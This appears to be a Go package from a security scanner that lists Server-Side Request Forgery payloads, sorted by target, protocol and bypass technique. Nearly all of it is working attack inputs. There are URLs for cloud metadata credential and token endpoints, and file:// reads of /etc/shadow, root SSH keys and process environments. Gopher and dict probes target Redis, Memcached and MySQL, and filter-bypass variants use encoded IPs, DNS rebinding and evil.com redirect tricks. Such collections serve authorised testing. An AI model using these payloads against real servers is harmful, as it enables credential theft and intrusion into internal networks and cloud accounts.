// Package ssrf provides Server-Side Request Forgery payloads.
// Payloads are categorized by:
//   - Target type (Internal, Cloud Metadata, Local Files)
//   - Protocol (HTTP, file, gopher, dict)
//   - Bypass technique (IP encoding, DNS rebinding, redirects)
package ssrf

// TargetType represents the SSRF target type.
type TargetType string

const (
	TargetInternal  TargetType = "internal"
	TargetCloud     TargetType = "cloud"
	TargetLocalFile TargetType = "file"
	TargetProtocol  TargetType = "protocol"
)

// Protocol represents the protocol used in SSRF.
type Protocol string

const (
	ProtocolHTTP   Protocol = "http"
	ProtocolHTTPS  Protocol = "https"
	ProtocolFile   Protocol = "file"
	ProtocolGopher Protocol = "gopher"
	ProtocolDict   Protocol = "dict"
	ProtocolFTP    Protocol = "ftp"
)

// Payload represents an SSRF payload.
type Payload struct {
	Value       string
	Target      TargetType
	Protocol    Protocol
	Description string
	WAFBypass   bool
	CloudType   string // aws, gcp, azure, digital_ocean, etc.
}

// GetPayloads returns payloads for a specific target type.
func GetPayloads(target TargetType) []Payload {
	switch target {
	case TargetInternal:
		return internalPayloads
	case TargetCloud:
		return cloudPayloads
	case TargetLocalFile:
		return filePayloads
	case TargetProtocol:
		return protocolPayloads
	default:
		return internalPayloads
	}
}

// GetCloudPayloads returns payloads for a specific cloud provider.
func GetCloudPayloads(cloudType string) []Payload {
	var result []Payload
	for _, p := range cloudPayloads {
		if p.CloudType == cloudType {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns SSRF payloads with bypass techniques.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all SSRF payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, internalPayloads...)
	all = append(all, cloudPayloads...)
	all = append(all, filePayloads...)
	all = append(all, protocolPayloads...)
	all = append(all, bypassPayloads...)
	return all
}

// Internal network payloads.
// Source: PayloadsAllTheThings, HackTricks
var internalPayloads = []Payload{
	// Localhost variations
	{Value: "http://127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Standard localhost"},
	{Value: "http://127.0.0.1:80", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost port 80"},
	{Value: "http://127.0.0.1:443", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost port 443"},
	{Value: "http://127.0.0.1:22", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost SSH"},
	{Value: "http://127.0.0.1:3306", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost MySQL"},
	{Value: "http://127.0.0.1:5432", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost PostgreSQL"},
	{Value: "http://127.0.0.1:6379", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Redis"},
	{Value: "http://127.0.0.1:11211", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Memcached"},
	{Value: "http://127.0.0.1:27017", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost MongoDB"},
	{Value: "http://127.0.0.1:9200", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Elasticsearch"},
	{Value: "http://127.0.0.1:8080", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost alt HTTP"},
	{Value: "http://127.0.0.1:8443", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost alt HTTPS"},

	{Value: "http://localhost", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost hostname"},
	{Value: "http://localhost:80", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost hostname port 80"},

	// Common internal ranges
	{Value: "http://192.168.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 192.168.0.1"},
	{Value: "http://192.168.1.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 192.168.1.1"},
	{Value: "http://10.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 10.0.0.1"},
	{Value: "http://172.16.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 172.16.0.1"},

	// IPv6 localhost
	{Value: "http://[::1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 localhost"},
	{Value: "http://[0:0:0:0:0:0:0:1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 full localhost"},
	{Value: "http://[::ffff:127.0.0.1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 mapped IPv4"},
}

// Cloud metadata payloads.
// Source: PayloadsAllTheThings, HackTricks
var cloudPayloads = []Payload{
	// AWS
	{Value: "http://169.254.169.254/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS metadata root", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/ami-id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS AMI ID", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS hostname", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IAM credentials", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/user-data", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS user data", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/dynamic/instance-identity/document", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS instance identity", CloudType: "aws"},

	// GCP
	{Value: "http://169.254.169.254/computeMetadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP metadata root", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/instance/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP hostname", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP service token", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/project/project-id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP project ID", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP metadata internal", CloudType: "gcp"},

	// Azure
	{Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure instance metadata", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure OAuth token", CloudType: "azure"},

	// DigitalOcean
	{Value: "http://169.254.169.254/metadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean metadata", CloudType: "digitalocean"},
	{Value: "http://169.254.169.254/metadata/v1/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean hostname", CloudType: "digitalocean"},
	{Value: "http://169.254.169.254/metadata/v1/id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean ID", CloudType: "digitalocean"},

	// Oracle Cloud
	{Value: "http://169.254.169.254/opc/v1/instance/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Oracle Cloud instance", CloudType: "oracle"},

	// Alibaba Cloud
	{Value: "http://100.100.100.200/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Alibaba Cloud metadata", CloudType: "alibaba"},

	// Kubernetes
	{Value: "https://kubernetes.default.svc/", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes API internal", CloudType: "kubernetes"},
	{Value: "https://kubernetes.default.svc/api/v1/namespaces", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes namespaces", CloudType: "kubernetes"},
}

// Local file access payloads.
// Source: PayloadsAllTheThings, HackTricks
var filePayloads = []Payload{
	// Linux files
	{Value: "file:///etc/passwd", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux passwd"},
	{Value: "file:///etc/shadow", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux shadow"},
	{Value: "file:///etc/hosts", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux hosts"},
	{Value: "file:///etc/hostname", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux hostname"},
	{Value: "file:///etc/issue", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux issue"},
	{Value: "file:///proc/self/environ", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process environment"},
	{Value: "file:///proc/self/cmdline", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process cmdline"},
	{Value: "file:///proc/self/fd/0", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process stdin"},
	{Value: "file:///root/.ssh/id_rsa", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Root SSH key"},
	{Value: "file:///root/.bash_history", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Root bash history"},

	// Web application files
	{Value: "file:///var/www/html/index.php", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Web root index"},
	{Value: "file:///var/www/html/.htaccess", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache htaccess"},
	{Value: "file:///var/log/apache2/access.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache access log"},
	{Value: "file:///var/log/apache2/error.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache error log"},
	{Value: "file:///var/log/nginx/access.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Nginx access log"},

	// Windows files
	{Value: "file:///c:/windows/win.ini", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Windows win.ini"},
	{Value: "file:///c:/windows/system32/drivers/etc/hosts", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Windows hosts"},
	{Value: "file:///c:/inetpub/wwwroot/web.config", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "IIS web.config"},
}

// Alternative protocol payloads.
// Source: HackTricks, PayloadsAllTheThings
var protocolPayloads = []Payload{
	// Gopher protocol (for exploiting internal services)
	{Value: "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis INFO"},
	{Value: "gopher://127.0.0.1:11211/_stats", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Memcached stats"},
	{Value: "gopher://127.0.0.1:3306/_", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher MySQL probe"},

	// Dict protocol
	{Value: "dict://127.0.0.1:6379/INFO", Target: TargetProtocol, Protocol: ProtocolDict, Description: "Dict Redis INFO"},
	{Value: "dict://127.0.0.1:11211/stats", Target: TargetProtocol, Protocol: ProtocolDict, Description: "Dict Memcached stats"},

	// FTP protocol
	{Value: "ftp://127.0.0.1/", Target: TargetProtocol, Protocol: ProtocolFTP, Description: "FTP localhost"},
	{Value: "ftp://anonymous:anonymous@127.0.0.1/", Target: TargetProtocol, Protocol: ProtocolFTP, Description: "FTP anonymous"},
}

// Bypass payloads using various techniques.
// Source: PayloadsAllTheThings, HackTricks
var bypassPayloads = []Payload{
	// Decimal IP encoding
	{Value: "http://2130706433", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Decimal IP 127.0.0.1", WAFBypass: true},
	{Value: "http://017700000001", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Octal IP 127.0.0.1", WAFBypass: true},
	{Value: "http://0x7f000001", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Hex IP 127.0.0.1", WAFBypass: true},
	{Value: "http://0x7f.0x0.0x0.0x1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Hex dotted 127.0.0.1", WAFBypass: true},
	{Value: "http://0177.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Mixed octal 127.0.0.1", WAFBypass: true},

	// Shortened IP
	{Value: "http://127.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Shortened localhost", WAFBypass: true},
	{Value: "http://0", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Zero localhost", WAFBypass: true},
	{Value: "http://0.0.0.0", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Zero IP", WAFBypass: true},

	// URL encoding
	{Value: "http://127.0.0.1%00@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Null byte injection", WAFBypass: true},
	{Value: "http://evil.com@127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Auth bypass", WAFBypass: true},
	{Value: "http://127.0.0.1#@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Fragment bypass", WAFBypass: true},
	{Value: "http://127.0.0.1?@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Query bypass", WAFBypass: true},

	// DNS rebinding setup
	{Value: "http://localtest.me", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "localtest.me (127.0.0.1)", WAFBypass: true},
	{Value: "http://127.0.0.1.nip.io", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "nip.io wildcard", WAFBypass: true},
	{Value: "http://127.0.0.1.xip.io", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "xip.io wildcard", WAFBypass: true},
	{Value: "http://spoofed.burpcollaborator.net", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "DNS rebind collaborator", WAFBypass: true},

	// Cloud metadata bypass
	{Value: "http://169.254.169.254.nip.io/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS via nip.io", WAFBypass: true, CloudType: "aws"},
	{Value: "http://[::ffff:169.254.169.254]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 mapped", WAFBypass: true, CloudType: "aws"},
	{Value: "http://0251.0376.0251.0376/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS octal IP", WAFBypass: true, CloudType: "aws"},
	{Value: "http://2852039166/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS decimal IP", WAFBypass: true, CloudType: "aws"},

	// Unicode/IDNA normalization
	{Value: "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Unicode localhost", WAFBypass: true},
	{Value: "http://①②⑦.⓪.⓪.①", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Unicode IP", WAFBypass: true},

	// Double URL encoding
	{Value: "http://%31%32%37%2e%30%2e%30%2e%31", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "URL encoded localhost", WAFBypass: true},
	{Value: "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Double URL encoded", WAFBypass: true},

	// Redirect-based
	{Value: "http://evil.com/redirect?url=http://127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Open redirect bypass", WAFBypass: true},
}
